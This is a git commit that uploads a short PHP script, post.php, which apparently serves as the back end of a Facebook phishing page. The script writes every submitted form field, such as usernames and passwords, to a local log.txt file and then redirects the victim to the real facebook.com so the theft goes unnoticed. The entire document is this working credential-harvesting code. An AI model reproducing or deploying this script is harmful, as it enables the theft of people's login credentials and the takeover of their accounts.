0d27c6b8ef06a04da1202a4d9df4f1af8f26af2f
puneetsagar33 <96741910+puneetsagar33@users.noreply.github.com>
2022-01-20 18:44:04 +0530

    Add files via upload

---
+++ post.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location: ');
+$handle = fopen("log.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+header("location:http://www.facebook.com");
+exit;
+?>
